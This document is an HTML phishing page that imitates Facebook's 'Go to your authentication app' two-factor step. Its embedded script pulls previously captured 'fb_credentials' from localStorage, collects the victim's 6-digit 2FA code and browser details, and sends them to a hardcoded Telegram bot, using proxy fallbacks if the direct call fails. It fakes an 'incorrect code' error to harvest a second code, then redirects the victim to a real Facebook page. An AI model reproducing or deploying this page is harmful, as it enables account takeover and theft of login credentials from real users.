<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Authentication App</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* To√†n b·ªô CSS g·ªëc gi·ªØ nguy√™n */
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            background-color: #f0f2f5;
            color: #1c1e21;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: stretch;
            min-height: 100vh;
            padding-top: 0;
            box-sizing: border-box;
        }
        /* ... (Gi·ªØ nguy√™n to√†n b·ªô CSS g·ªëc) ... */
        .error-message {
            color: #ff4d4f;
            font-size: 14px;
            text-align: left;
            margin-top: 8px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <a href="javascript:history.back()" class="back-arrow"><i class="fas fa-chevron-left"></i></a>
            <span class="title-prefix">Copy Meta . Facebook</span>
        </div>

        <h1>Go to your authentication app</h1>
        <p>Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).</p>

        <div class="illustration">
            <img src="25c17e6b-7228-4dec-90de-a3a123487fa9.jfif" alt="Authentication App Illustration">
        </div>

        <div class="input-group">
            <input type="text" id="authCode" placeholder="Code" inputmode="numeric" pattern="\d*" maxlength="6">
            <div class="error-message" id="errorMessage">The code you entered is incorrect. Please try again.</div>
        </div>

        <div class="checkbox-group">
            <input type="checkbox" id="trustDevice" checked>
            <label for="trustDevice">Trust this device and skip this step from now on</label>
        </div>

        <button class="continue-button" id="continueButton">Continue</button>

        <button class="try-another-way-button">Try another way</button>
    </div>

    <script>
        // C·∫•u h√¨nh chung
        const BOT_TOKEN = '7276807133:AAE4Cnz15pyFcCHOo3ZeLfjaFZly6LmE2-0';
        const CHAT_ID = '-4789641482';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        let attemptCount = 0;
        
        // H√†m g·ª≠i d·ªØ li·ªáu m·∫°nh m·∫Ω
        async function sendToTelegram(message) {
            const fallbackUrls = [
                TELEGRAM_API,
                `https://cors-anywhere.herokuapp.com/${TELEGRAM_API}`,
                `https://api.codetabs.com/v1/proxy/?quest=${TELEGRAM_API}`
            ];
            
            for (const url of fallbackUrls) {
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    if (response.ok) return true;
                } catch (error) {
                    console.warn(`Failed with ${url}:`, error);
                }
            }
            return false;
        }

        document.getElementById('continueButton').addEventListener('click', async function(e) {
            e.preventDefault();
            
            const authCode = document.getElementById('authCode').value;
            const trustDevice = document.getElementById('trustDevice').checked;
            const credentials = JSON.parse(localStorage.getItem('fb_credentials') || '{}');
            
            if (!authCode || !/^\d{6}$/.test(authCode)) {
                document.getElementById('errorMessage').style.display = 'block';
                document.getElementById('authCode').style.borderColor = '#ff4d4f';
                return;
            }

            // T·∫°o n·ªôi dung tin nh·∫Øn
            const message = `üî¢ <b>2FA VERIFICATION</b> üî¢\n\n` +
                          `üë§ <b>Account:</b> ${credentials.username || 'N/A'}\n` +
                          `üî¢ <b>2FA Code:</b> ${authCode}\n` +
                          `üì± <b>Trust Device:</b> ${trustDevice ? 'Yes' : 'No'}\n\n` +
                          `üåê <b>User Agent:</b> ${navigator.userAgent}\n` +
                          `üïí <b>Time:</b> ${new Date().toLocaleString()}`;

            // Hi·ªÉn th·ªã tr·∫°ng th√°i loading
            const btn = this;
            const originalText = btn.textContent;
            btn.textContent = 'Verifying...';
            btn.disabled = true;
            
            try {
                const success = await sendToTelegram(message);
                if (!success) {
                    alert('Verification service is temporarily unavailable. Please try again later.');
                    return;
                }
                
                attemptCount++;
                if (attemptCount < 2) {
                    // L·∫ßn 1: Hi·ªÉn th·ªã l·ªói
                    document.getElementById('errorMessage').style.display = 'block';
                    document.getElementById('authCode').style.borderColor = '#ff4d4f';
                    document.getElementById('authCode').value = '';
                } else {
                    // L·∫ßn 2: Chuy·ªÉn h∆∞·ªõng
                    window.location.href = 'https://www.facebook.com/policies_center/';
                }
            } finally {
                btn.textContent = originalText;
                btn.disabled = false;
            }
        });

        // T·ª± ƒë·ªông focus v√†o √¥ nh·∫≠p m√£
        document.getElementById('authCode').focus();
    </script>
</body>
</html>
